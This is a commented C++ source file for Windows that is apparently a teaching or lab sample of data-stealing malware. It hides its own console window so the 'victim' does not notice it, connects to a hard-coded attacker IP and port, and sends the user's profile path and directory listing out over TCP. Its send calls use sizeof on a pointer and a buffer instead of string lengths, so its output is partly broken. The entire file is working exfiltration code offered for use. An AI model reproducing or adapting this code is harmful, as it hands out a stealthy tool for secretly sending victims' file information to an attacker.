#define _WINSOCK_DEPRECATED_NO_WARNINGS //We use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs.
#pragma comment(lib, "Ws2_32.lib") //We need the Ws2_32.lib library in order to use sockets (networking) functionality in Windows.
#include <iostream>
#include <winsock2.h> //includes networking utilities
#include <stdio.h> //includes standard input/output utilities (needed for perror())
#include <stdlib.h> //includes standard input/output utilities
#include <dirent.h> //includes directory utilities
#include <string> 


char* userDirectory() { //This function gets the value of %USERPROFILE% environment variable.
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); //To hide the program window so that it's not obvious to the victim that this program is running!
    WSADATA WSAData; //This data type (it's a struct) holds information about windows socket implementation.
    SOCKET server; //This data type stores the connection of the SOCKET type.
    SOCKADDR_IN addr; //This data type (it's a struct) holds the details of socket connection.

    WSAStartup(MAKEWORD(2, 0), &WSAData); //Initialize usage of the winsock library (needed for opening a network connection).
    server = socket(AF_INET, SOCK_STREAM, 0); //Set up a TCP socket. AF_INET means address family for IPv4. SOCK_STREAM means that we want a TCP socket.


    //The above snippet would set the IP address of the target we wish to sent the data to (that would be the attacker's IP address). The port used would be 5555 and the IP address is IPv4 which is indicated by AF_INET.
    addr.sin_addr.s_addr = inet_addr("10.10.15.2"); //change this to your listening ip
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555); //you can change this port

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); //Connect to the previously set up target host/port.

    char* pPath = userDirectory(); //Get the user directory using the userDirectory function.

    //Send the user directory path to the attacker. This is followed by a newline so that the output received by the attacker is properly formatted - 1 entry per line.
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);



    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }
    //The above snippet opens the user's directory and then reads the entries in it. All the entries are then sent back to the attacker's machine over the established TCP socket. A newline is also sent, so that the directory listing is displayed with one entry per line. In case the directory cannot be opened, the program will display the associated error using the call to perror().


    closesocket(server); //Close the socket.
    WSACleanup(); //Clean up the Winsock library components.
}